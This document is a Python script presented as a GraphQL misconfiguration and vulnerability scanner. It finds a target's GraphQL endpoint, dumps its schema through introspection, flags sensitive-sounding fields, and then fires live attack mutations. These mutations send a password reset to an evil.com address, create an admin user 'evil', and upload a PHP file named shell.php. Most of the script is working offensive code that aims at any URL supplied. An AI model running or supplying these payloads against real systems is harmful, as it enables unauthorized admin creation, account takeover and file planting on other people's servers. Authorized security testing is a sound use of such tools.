#!/usr/bin/env python3
import requests
import json
import argparse
import warnings
from termcolor import colored

warnings.filterwarnings("ignore", category=UserWarning)

INTROSPECTION_QUERY = {
    "query": """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields {
            name
            type {
              name
              kind
            }
          }
        }
      }
    }
    """
}

COMMON_ENDPOINTS = [
    "/graphql", "/gql", "/api/graphql", "/graphiql", "/graphql/v1", "/playground"
]

SENSITIVE_KEYWORDS = [
    "login", "reset", "password", "admin", "update", "delete", "upload", "register"
]

def detect_endpoint(base_url):
    for endpoint in COMMON_ENDPOINTS:
        full_url = base_url.rstrip("/") + endpoint
        try:
            r = requests.post(full_url, json={"query": "{__typename}"}, timeout=5, verify=False)
            if "data" in r.text:
                print(colored(f"[+] GraphQL endpoint found: {full_url}", "green"))
                return full_url
        except:
            continue
    print(colored("[-] GraphQL endpoint not found", "red"))
    return None

def introspection(url):
    try:
        r = requests.post(url, json=INTROSPECTION_QUERY, timeout=8, verify=False)
        if "data" in r.text:
            print(colored("[✔] Introspection is enabled!", "green"))
            return r.json()
        else:
            print(colored("[-] Introspection disabled", "yellow"))
            return None
    except Exception as e:
        print(colored(f"[!] Error during introspection: {e}", "red"))
        return None

def extract_sensitive(schema_data):
    print("\n[🔍] Looking for sensitive fields/functions:")
    found = False
    types = schema_data.get("data", {}).get("__schema", {}).get("types", [])
    for t in types:
        if t.get("fields"):
            for field in t["fields"]:
                fname = field["name"].lower()
                for keyword in SENSITIVE_KEYWORDS:
                    if keyword in fname:
                        found = True
                        print(colored(f"  ⚠️  Sensitive function: {t['name']}.{field['name']}", "yellow"))
    if not found:
        print(colored("  ❌ No sensitive fields found by keywords.", "cyan"))

def dump_schema(schema_data):
    print(colored("\n[📜] Dumping schema (summary)...", "blue"))
    types = schema_data.get("data", {}).get("__schema", {}).get("types", [])
    for t in types:
        if t.get("fields"):
            print(colored(f"Type: {t['name']}", "magenta"))
            for field in t["fields"]:
                print(f"   ↪ {field['name']}")

def fuzz_mutations(url):
    print(colored("\n[🧪] Fuzzing for common vulnerabilities in mutations...", "blue"))
    test_mutations = [
        {"query": "mutation { resetPassword(email:\"test@evil.com\") }"},
        {"query": "mutation { createAdminUser(username:\"evil\", password:\"evil\") }"},
        {"query": "mutation { uploadFile(name:\"shell.php\", content:\"<?php echo 'pwn'; ?>\") }"}
    ]
    for payload in test_mutations:
        try:
            r = requests.post(url, json=payload, timeout=5, verify=False)
            if "errors" not in r.text:
                print(colored(f"[💣] Mutation may have succeeded: {payload['query']}", "red"))
            else:
                print(colored(f"[~] Mutation blocked: {payload['query']}", "cyan"))
        except:
            continue

def main():
    parser = argparse.ArgumentParser(description="🧬 GraphQL Misconfig & Vuln Scanner")
    parser.add_argument("target", help="Base URL (e.g. https://target.com/)")
    args = parser.parse_args()

    print(colored(f"\n[🎯] Target: {args.target}", "blue"))
    gql_url = detect_endpoint(args.target)

    if gql_url:
        schema = introspection(gql_url)
        if schema:
            dump_schema(schema)
            extract_sensitive(schema)
        fuzz_mutations(gql_url)

if __name__ == "__main__":
    main()
